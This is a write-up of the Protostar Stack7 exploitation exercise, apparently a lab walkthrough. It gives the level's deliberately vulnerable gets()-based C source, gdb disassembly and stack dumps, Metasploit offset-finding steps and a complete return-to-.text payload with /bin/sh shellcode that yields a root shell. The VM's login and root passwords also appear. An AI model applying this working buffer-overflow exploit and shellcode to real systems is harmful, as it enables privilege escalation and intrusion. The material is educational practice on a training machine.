# Protostar - Stack7
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack7__
* About
  Stack6 introduces return to .text to gain code execution.

  The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

  This level is at /opt/protostar/bin/stack7

* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();



}

```

  After checking the code I found that the code prevent me to return to address began with 0xbXXXXXXX so I had to return to another address.

  First, we have to see what is the exact position of EIP by using pattern_create.rb
```
root@BOEING:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```
(gdb) run
Starting program: /opt/protostar/bin/stack7 
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb)
```

```
root@BOEING:~#  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q  0x37634136
[*] Exact match at offset 80
```

  I had 80-byte buffer. 

## Return to .Text
  .text is just a section of assembly code. We will now return to return instruction of getpath() function 
  1. Find the address of return instruction of getpath() function
```
(gdb) disassemble getpath
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   %ebp
0x080484c5 <getpath+1>: mov    %esp,%ebp
0x080484c7 <getpath+3>: sub    $0x68,%esp
0x080484ca <getpath+6>: mov    $0x8048620,%eax
0x080484cf <getpath+11>:        mov    %eax,(%esp)
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    0x8049780,%eax
0x080484dc <getpath+24>:        mov    %eax,(%esp)
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484e7 <getpath+35>:        mov    %eax,(%esp)
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    0x4(%ebp),%eax
0x080484f2 <getpath+46>:        mov    %eax,-0xc(%ebp)
0x080484f5 <getpath+49>:        mov    -0xc(%ebp),%eax
0x080484f8 <getpath+52>:        and    $0xb0000000,%eax
0x080484fd <getpath+57>:        cmp    $0xb0000000,%eax
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    $0x8048634,%eax
0x08048509 <getpath+69>:        mov    -0xc(%ebp),%edx
0x0804850c <getpath+72>:        mov    %edx,0x4(%esp)
0x08048510 <getpath+76>:        mov    %eax,(%esp)
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        movl   $0x1,(%esp)
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    $0x8048640,%eax
0x08048529 <getpath+101>:       lea    -0x4c(%ebp),%edx
0x0804852c <getpath+104>:       mov    %edx,0x4(%esp)
0x08048530 <getpath+108>:       mov    %eax,(%esp)
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    -0x4c(%ebp),%eax
0x0804853b <getpath+119>:       mov    %eax,(%esp)
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave  
0x08048544 <getpath+128>:       ret    
End of assembler dump.
(gdb) 
```
  The address of return instruction: 0x08048544

  2. Find the address of stack
```
(gdb) disassemble getpath 
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   %ebp
0x080484c5 <getpath+1>: mov    %esp,%ebp
0x080484c7 <getpath+3>: sub    $0x68,%esp
0x080484ca <getpath+6>: mov    $0x8048620,%eax
0x080484cf <getpath+11>:        mov    %eax,(%esp)
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    0x8049780,%eax
0x080484dc <getpath+24>:        mov    %eax,(%esp)
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484e7 <getpath+35>:        mov    %eax,(%esp)
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    0x4(%ebp),%eax
0x080484f2 <getpath+46>:        mov    %eax,-0xc(%ebp)
0x080484f5 <getpath+49>:        mov    -0xc(%ebp),%eax
0x080484f8 <getpath+52>:        and    $0xb0000000,%eax
0x080484fd <getpath+57>:        cmp    $0xb0000000,%eax
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    $0x8048634,%eax
0x08048509 <getpath+69>:        mov    -0xc(%ebp),%edx
0x0804850c <getpath+72>:        mov    %edx,0x4(%esp)
0x08048510 <getpath+76>:        mov    %eax,(%esp)
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        movl   $0x1,(%esp)
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    $0x8048640,%eax
0x08048529 <getpath+101>:       lea    -0x4c(%ebp),%edx
0x0804852c <getpath+104>:       mov    %edx,0x4(%esp)
0x08048530 <getpath+108>:       mov    %eax,(%esp)
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    -0x4c(%ebp),%eax
0x0804853b <getpath+119>:       mov    %eax,(%esp)
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave  
0x08048544 <getpath+128>:       ret    
End of assembler dump.
(gdb) b *0x08048544
Breakpoint 1 at 0x8048544: file stack7/stack7.c, line 24.
(gdb) run
Starting program: /opt/protostar/bin/stack7 
input path please: AAAAAA
got path AAAAAA

Breakpoint 1, 0x08048544 in getpath () at stack7/stack7.c:24
24      stack7/stack7.c: No such file or directory.
        in stack7/stack7.c
(gdb) x/40xw $esp
0xbffff7cc:     0x08048550      0x08048570      0x00000000      0xbffff858
0xbffff7dc:     0xb7eadc76      0x00000001      0xbffff884      0xbffff88c
0xbffff7ec:     0xb7fe1848      0xbffff840      0xffffffff      0xb7ffeff4
0xbffff7fc:     0x080482bc      0x00000001      0xbffff840      0xb7ff0626
0xbffff80c:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff81c:     0x00000000      0xbffff858      0xd9f22846      0xf3a59e56
0xbffff82c:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffff83c:     0x08048410      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffff84c:     0xb7ffeff4      0x00000001      0x08048410      0x00000000
0xbffff85c:     0x08048431      0x08048545      0x00000001      0xbffff884
(gdb) s
```
  When the program hit the breakpoint at return instruction of getpath() it will pop the return address of the stack and move to another one. Then we will place next stack address with our shellcode so the address we will use is 0xbffff7cc + (current stack address 4) + (next stack address 4) = our shellcode address =  0xbffff7d4

  3. Prepare final payload
  > {NOP or Some Buffer}(80) + {Address of return instruction}(4) + {Address of stack}(4) + {NOPs sled}(100) + {Shellcode} 
```
python -c 'print("\x90"*(80) + "\x44\x85\x04\x08" + "\xd4\xf7\xff\xbf" +  "\x90"*100 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42")' > /tmp/exploit7_ret2text
```

Got the shell.
```
user@protostar:~$ python -c 'print("\x90"*(80) + "\x44\x85\x04\x08" + "\xd4\xf7\xff\xbf" +  "\x90"*100 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42")' > /tmp/exploit7_ret2text
user@protostar:~$ cat /tmp/exploit7_ret2text - | /opt/protostar/bin/stack7
input path please: got path in/shJAAAABBBB
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root

```
